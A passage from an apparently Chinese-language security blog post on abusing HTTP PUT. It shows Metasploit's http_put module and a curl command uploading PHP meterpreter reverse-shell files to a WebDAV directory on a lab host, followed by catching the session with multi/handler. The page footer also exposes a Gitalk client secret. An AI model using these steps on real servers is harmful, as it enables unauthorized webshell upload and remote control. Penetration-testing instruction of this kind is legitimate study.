+<p><img src="https://i1.wp.com/4.bp.blogspot.com/-847UTwuj7Ic/W77rkILqtQI/AAAAAAAAaqo/eGJGmT_PuNoKNwT5JUwRk8k7n20swx4EwCEwYBhgL/s1600/16.png?w=687&ssl=1" alt="img"></p>
+<h3 id="0x07Metasploit"><a href="#0x07Metasploit" class="headerlink" title="0x07Metasploit"></a><strong>0x07Metasploit</strong></h3><p>Metasploit Framework是一个众所周知的开发，测试和执行漏洞的平台。它是一种用于对目标计算机执行各种攻击的开源工具。此模块可以滥用配置错误的Web服务器，通过PUT和DELETE HTTP请求上传和删除Web内容。将ACTION设置为PUT或DELETE。PUT是默认值。</p>
+<p>Metasploit内置了专用于扫描HTTP方法的辅助模块，并使我们能够使用辅助/ scanner / http / http_put输出文件.Below是完成相同操作的命令</p>
+<table>
+<thead>
+<tr>
+<th align="center"><strong>1</strong></th>
+<th><strong>msf&gt; use auxiliary/scanner/http/http_put</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>2</strong></td>
+<td><strong>msf&gt;auxiliary (http_put) &gt; set rhosts 192.168.1.103</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>3</strong></td>
+<td><strong>msf&gt;auxiliary (http_put) &gt; set payload php/meterpreter/reverse_tcp</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>4</strong></td>
+<td><strong>msf&gt;auxiliary (http_put) &gt; set path /dav/</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>5</strong></td>
+<td><strong>msf&gt;auxiliary (http_put) &gt; set filename meter.php</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>6</strong></td>
+<td><strong>msf&gt;auxiliary (http_put) &gt; set filedata file://root/Desktop/meter.php</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>7</strong></td>
+<td><strong>msf&gt;auxiliary (http_put) &gt; exploit</strong></td>
+</tr>
+</tbody></table>
+<p><img src="https://i1.wp.com/1.bp.blogspot.com/-UgEr2Yr62zc/W77rkVegsHI/AAAAAAAAaqw/_g91tLVqKZYk0Xdok8MV99PNwXs5Wf_lwCEwYBhgL/s1600/17.png?w=687&ssl=1" alt="img"></p>
+<p>在浏览器192.168.1.103/dav中键入相同的URL并执行相同的操作。从屏幕截图中可以看出，文件meter.php已经上传到Web服务器上。</p>
+<p> <strong><img src="https://i1.wp.com/4.bp.blogspot.com/-tOZRLMDQ8y4/W77rkhs-ilI/AAAAAAAAaqw/0spu0p-6fxoFpSortWVf99HYJLKHPMCVACEwYBhgL/s1600/18.png?w=687&ssl=1" alt="img"></strong></p>
+<p>同时，打开metasploit MSF控制台并使用multi / handler; 然后回到之前上传的<strong>meter.php</strong>文件并运行它。这将为我们提供一个预备会话。</p>
+<p><img src="https://i2.wp.com/3.bp.blogspot.com/-Xtw0_4WL1GE/W77rk6gdCyI/AAAAAAAAapw/gipaCNagefk8ru9lpgGvVpT76WErG4p4wCEwYBhgL/s1600/19.png?w=687&ssl=1" alt="img"></p>
+<h3 id="0x08cURL"><a href="#0x08cURL" class="headerlink" title="0x08cURL"></a><strong>0x08cURL</strong></h3><p>cURL是一个众所周知的命令行工具，使用URL语法发送或接收数据，并与各种众所周知的协议（HTTPS，FTP，SCP，LDAP，Telnet等）兼容。</p>
+<p>要使用cURL来利用PUT方法，命令是：</p>
+<table>
+<thead>
+<tr>
+<th>1</th>
+<th>curl <a href="http://192.168.1.103/dav/" target="_blank" rel="noopener">http://192.168.1.103/dav/</a> --upload-file /root/Desktop/curl.php -v</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><img src="https://i2.wp.com/1.bp.blogspot.com/-FXYI2gJx5aw/W77rlHUWziI/AAAAAAAAaqk/rXCIGrnnUJs8dvw8k2VQ39-m8V7CvmBewCEwYBhgL/s1600/20.png?w=687&ssl=1" alt="img"></p>
+<p>在浏览器192.168.1.103/dav中键入相同的URL并执行相同的操作。从屏幕截图中可以看出，文件curl.php已经上传到Web服务器上。</p>
+<p> <strong><img src="https://i0.wp.com/1.bp.blogspot.com/-_KL9pTHjtSA/W77rlh45foI/AAAAAAAAaq0/uh8M3MDSSHEVwtbg8Kh5oPHtvJjphLX8gCEwYBhgL/s1600/21.png?w=687&ssl=1" alt="img"></strong></p>
+<p>同时，打开metasploit MSF控制台并使用multi / handler; 然后回到之前上传的<strong>curl.php</strong>文件并运行它。这将为我们提供一个预备会话。</p>
+<p><img src="https://i0.wp.com/1.bp.blogspot.com/-UXj9gK3LABE/W77rludV3UI/AAAAAAAAaqo/LSN6R3rE2N0fyFqjQtnVFYFoa8y-jHMwgCEwYBhgL/s1600/22.png?w=687&ssl=1" alt="img"></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2018/12/23/2018-12-23-利用PUT方法的多种方法/" title="利用PUT方法的多种方法">https://wh0ale.github.io/2018/12/23/2018-12-23-利用PUT方法的多种方法/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2018/12/23/2018-12-23-利用Tomcat Manager的多种方法/" rel="next" title="利用Tomcat Manager的多种方法">
+                <i class="fa fa-chevron-left"></i> 利用Tomcat Manager的多种方法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2018/12/24/2018-12-24-甲方安全（二）/" rel="prev" title="甲方安全（二）工具篇">
+                甲方安全（二）工具篇 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01表中的内容"><span class="nav-number">1.</span> <span class="nav-text">0x01表中的内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02HTTP-PUT方法简介"><span class="nav-number">2.</span> <span class="nav-text">0x02HTTP PUT方法简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03Cadaver"><span class="nav-number">3.</span> <span class="nav-text">0x03Cadaver</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04NMAP"><span class="nav-number">4.</span> <span class="nav-text">0x04NMAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05Poster"><span class="nav-number">5.</span> <span class="nav-text">0x05Poster</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06Burpsuite"><span class="nav-number">6.</span> <span class="nav-text">0x06Burpsuite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07Metasploit"><span class="nav-number">7.</span> <span class="nav-text">0x07Metasploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08cURL"><span class="nav-number">8.</span> <span class="nav-text">0x08cURL</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
